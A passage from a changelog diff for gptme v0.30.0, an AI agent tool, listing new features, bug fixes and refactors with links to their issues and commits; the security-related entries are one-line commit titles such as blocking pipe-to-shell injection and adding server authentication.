+ - feat: support OPENROUTER_API_KEY for perplexity ([#828](https://github.com/gptme/gptme/issues/828)) ([`658c4450`](https://github.com/gptme/gptme/commit/658c4450))
+ - feat(validation): add MESSAGE_POST_PROCESS hook for markdown codeblock cut-off detection ([#824](https://github.com/gptme/gptme/issues/824)) ([`ed01e1cb`](https://github.com/gptme/gptme/commit/ed01e1cb))
+ - feat: add support for gptme.local.toml configuration layering ([#617](https://github.com/gptme/gptme/issues/617)) ([`3dfcc9e5`](https://github.com/gptme/gptme/commit/3dfcc9e5))
+ - feat(gepa): add PromptImprovementModule to fix InputField architecture issue ([#823](https://github.com/gptme/gptme/issues/823)) ([`825d71aa`](https://github.com/gptme/gptme/commit/825d71aa))
+ - feat(lessons): Phase 5.5 - Dynamic top-K selection ([#820](https://github.com/gptme/gptme/issues/820)) ([`7d7fcc45`](https://github.com/gptme/gptme/commit/7d7fcc45))
+ - feat(lessons): Add ACE-inspired hybrid lesson matching ([#817](https://github.com/gptme/gptme/issues/817)) ([`1bdd9de5`](https://github.com/gptme/gptme/commit/1bdd9de5))
+ - feat: add hook support to server API v2 ([#769](https://github.com/gptme/gptme/issues/769)) ([`104aacff`](https://github.com/gptme/gptme/commit/104aacff))
+ - feat(llm): add custom OpenAI-compatible providers support ([#800](https://github.com/gptme/gptme/issues/800)) ([`cdf548ee`](https://github.com/gptme/gptme/commit/cdf548ee))
+ - feat(subagent): add planner mode for task delegation ([#753](https://github.com/gptme/gptme/issues/753)) ([`71b72b9b`](https://github.com/gptme/gptme/commit/71b72b9b))
+ - feat(server): auto-generate auth token and document security risks ([#803](https://github.com/gptme/gptme/issues/803)) ([`f652e752`](https://github.com/gptme/gptme/commit/f652e752))
+ - feat(hooks): improve typing for hook registration with Protocol overloads ([#801](https://github.com/gptme/gptme/issues/801)) ([`7bb17df7`](https://github.com/gptme/gptme/commit/7bb17df7))
+ - feat(eval): implement Docker-based execution environment ([#791](https://github.com/gptme/gptme/issues/791)) ([`7c676168`](https://github.com/gptme/gptme/commit/7c676168))
+ - feat(dspy): implement multi-stage reasoning program for GEPA ([#786](https://github.com/gptme/gptme/issues/786)) ([`a7f87c58`](https://github.com/gptme/gptme/commit/a7f87c58))
+ - feat: log a warning when context command output is large ([#787](https://github.com/gptme/gptme/issues/787)) ([`cf741f84`](https://github.com/gptme/gptme/commit/cf741f84))
+ - feat(server): implement token-based authentication for dev environment ([#782](https://github.com/gptme/gptme/issues/782)) ([`65507d7b`](https://github.com/gptme/gptme/commit/65507d7b))
+ - feat(lessons): add Cursor rules integration and project-local lessons support ([#779](https://github.com/gptme/gptme/issues/779)) ([`2ddc0e00`](https://github.com/gptme/gptme/commit/2ddc0e00))
+ - feat(tools/shell): store truncated output before discarding ([#775](https://github.com/gptme/gptme/issues/775)) ([`b7c44982`](https://github.com/gptme/gptme/commit/b7c44982))
+
+### 🐛 Fixes (30)
+<details><summary>Click to expand</summary>
+<p>
+
+ - fix: added SC2016 as excluded shellcheck code ([`436b335d`](https://github.com/gptme/gptme/commit/436b335d))
+ - fix: fix broken favicon in the root path ([#847](https://github.com/gptme/gptme/issues/847)) ([`421194a1`](https://github.com/gptme/gptme/commit/421194a1))
+ - fix: remove xfail markers from previously flaky server tests ([#849](https://github.com/gptme/gptme/issues/849)) ([`1645926d`](https://github.com/gptme/gptme/commit/1645926d))
+ - fix(gepa): Phase 3.3 - Fix task source and auto parameter conflicts ([#837](https://github.com/gptme/gptme/issues/837)) ([`dbbbc849`](https://github.com/gptme/gptme/commit/dbbbc849))
+ - fix(security): block command injection via pipe-to-shell patterns ([#840](https://github.com/gptme/gptme/issues/840)) ([`87cd354d`](https://github.com/gptme/gptme/commit/87cd354d))
+ - fix(gepa): remove auto parameter conflict in MIPROv2 ([#835](https://github.com/gptme/gptme/issues/835)) ([`7e51e0ac`](https://github.com/gptme/gptme/commit/7e51e0ac))
+ - fix: fixed Kimi K2 thinking toolcall support via OpenRouter ([#830](https://github.com/gptme/gptme/issues/830)) ([`5a758dbc`](https://github.com/gptme/gptme/commit/5a758dbc))
+ - fix: resolve MCP tool loading issues and connection errors ([#825](https://github.com/gptme/gptme/issues/825)) ([`72a4d85b`](https://github.com/gptme/gptme/commit/72a4d85b))
+ - fix(subagent): add missing tool_format parameter to chat() calls ([`3167b336`](https://github.com/gptme/gptme/commit/3167b336))
+ - fix(gepa): export ANTHROPIC_API_KEY and suppress verbose logs ([#821](https://github.com/gptme/gptme/issues/821)) ([`aeefe9b4`](https://github.com/gptme/gptme/commit/aeefe9b4))
+ - fix(gepa): collect and save trajectory feedback in optimization results ([#819](https://github.com/gptme/gptme/issues/819)) ([`603ccfef`](https://github.com/gptme/gptme/commit/603ccfef))
+ - fix(eval): fix reflection model used in GEPA optimizer ([#814](https://github.com/gptme/gptme/issues/814)) ([`6345f0c2`](https://github.com/gptme/gptme/commit/6345f0c2))
+ - fix(eval): add defensive check for eval_result in task_success_metric ([#813](https://github.com/gptme/gptme/issues/813)) ([`644eadd9`](https://github.com/gptme/gptme/commit/644eadd9))
+ - fix(server): add GPTME_DISABLE_AUTH env var for k8s deployments ([#811](https://github.com/gptme/gptme/issues/811)) ([`dd491017`](https://github.com/gptme/gptme/commit/dd491017))
+ - fix(tmux): use dashes instead of underscores for tmux tool function ([#810](https://github.com/gptme/gptme/issues/810)) ([`e1119abe`](https://github.com/gptme/gptme/commit/e1119abe))
+ - fix(shell): added SC2002 to default shellcheck excludes ([`3c088d37`](https://github.com/gptme/gptme/commit/3c088d37))
+ - fix: improve shell error handling and add Anthropic debug logging ([`cdd90afb`](https://github.com/gptme/gptme/commit/cdd90afb))
+ - fix: fix session start hook msgs not being persisted ([#808](https://github.com/gptme/gptme/issues/808)) ([`43a8c55d`](https://github.com/gptme/gptme/commit/43a8c55d))
+ - fix(eval): run gptme agent inside Docker when --use-docker is used ([#805](https://github.com/gptme/gptme/issues/805)) ([`84f18eb3`](https://github.com/gptme/gptme/commit/84f18eb3))
+ - fix(shell): handle bashlex parsing errors for bash builtins like 'time' ([#799](https://github.com/gptme/gptme/issues/799)) ([`0e18bf53`](https://github.com/gptme/gptme/commit/0e18bf53))
+ - fix(shell): added rg, ag, ast-grep, hyperfine to mentioned installed shell commands ([`3c2b3f8e`](https://github.com/gptme/gptme/commit/3c2b3f8e))
+ - fix(tests): update test_auto_compact.py for timestamp-based naming ([#797](https://github.com/gptme/gptme/issues/797)) ([`8142f895`](https://github.com/gptme/gptme/commit/8142f895))
+ - fix(autocompact): restore manager state after fork to prevent name mutation ([#794](https://github.com/gptme/gptme/issues/794)) ([`ce25affc`](https://github.com/gptme/gptme/commit/ce25affc))
+ - fix(autocompact): resolve NameError and naming bug ([#792](https://github.com/gptme/gptme/issues/792)) ([`16032e48`](https://github.com/gptme/gptme/commit/16032e48))
+ - fix: dont mistake absolute path for command when given as prompt ([`55c5a92d`](https://github.com/gptme/gptme/commit/55c5a92d))
+ - fix(server): support query param token for SSE authentication ([#785](https://github.com/gptme/gptme/issues/785)) ([`66b418a5`](https://github.com/gptme/gptme/commit/66b418a5))
+ - fix: convert GEPA output_dir to absolute path to prevent FileNotFoundError ([#784](https://github.com/gptme/gptme/issues/784)) ([`ad5f47a1`](https://github.com/gptme/gptme/commit/ad5f47a1))
+ - fix(shell): handle logical OR operators (||) in pipe detection ([#777](https://github.com/gptme/gptme/issues/777)) ([`d52a1729`](https://github.com/gptme/gptme/commit/d52a1729))
+ - fix(anthropic): retry on RemoteProtocolError's ([#773](https://github.com/gptme/gptme/issues/773)) ([`9c7b4874`](https://github.com/gptme/gptme/commit/9c7b4874))
+ - fix(shell): denylist pkill and killall (fixes [#768](https://github.com/gptme/gptme/issues/768)) ([#770](https://github.com/gptme/gptme/issues/770)) ([`6c793939`](https://github.com/gptme/gptme/commit/6c793939))
+
+</p>
+</details>
+
+### 🔨 Misc (12)
+<details><summary>Click to expand</summary>
+<p>
+
+ - chore: bump version to 0.30.0 ([`bc4d8cd2`](https://github.com/gptme/gptme/commit/bc4d8cd2))
+ - tests: add xfail to flaky test ([`0d9448af`](https://github.com/gptme/gptme/commit/0d9448af))
+ - tests: add xfail to flaky test ([`2db3c003`](https://github.com/gptme/gptme/commit/2db3c003))
+ - tests: fixed flaky tests ([`5eb817bd`](https://github.com/gptme/gptme/commit/5eb817bd))
+ - refactor: extract cwd tracking to hook and refactor time/token awareness to clean hooks ([#839](https://github.com/gptme/gptme/issues/839)) ([`32dc01f6`](https://github.com/gptme/gptme/commit/32dc01f6))
+ - Refactor threading.local to ContextVars support ([#827](https://github.com/gptme/gptme/issues/827)) ([`cb157ea1`](https://github.com/gptme/gptme/commit/cb157ea1))
+ - refactor: migrate TTS to hook-based architecture ([#816](https://github.com/gptme/gptme/issues/816)) ([`83cbe9ff`](https://github.com/gptme/gptme/commit/83cbe9ff))
+ - chore: change default TTS server port from 8000 to 8765 ([#815](https://github.com/gptme/gptme/issues/815)) ([`48f11f2c`](https://github.com/gptme/gptme/commit/48f11f2c))
+ - refactor: move len_tokens and related code into gptme.util.tokens ([#809](https://github.com/gptme/gptme/issues/809)) ([`62ba557b`](https://github.com/gptme/gptme/commit/62ba557b))
+ - perf: improve startup time by using `shutil.which` to check for pre-commit instead of `pre-commit --version` ([`630c0cc0`](https://github.com/gptme/gptme/commit/630c0cc0))
+ - docs: add comprehensive lesson system documentation ([#771](https://github.com/gptme/gptme/issues/771)) ([`5671da68`](https://github.com/gptme/gptme/commit/5671da68))
+ - docs(lessons): add Phase 6 comprehensive documentation ([#795](https://github.com/gptme/gptme/issues/795)) ([`8e11c24f`](https://github.com/gptme/gptme/commit/8e11c24f))
+
+</p>
+</details>
+
+*(excluded 7 less relevant [commits](https://github.com/gptme/gptme/compare/v0.29.0...v0.30.0))*
+
+**Full Changelog**: https://github.com/gptme/gptme/compare/v0.29.0...v0.30.0
 
 
 # v0.29.0
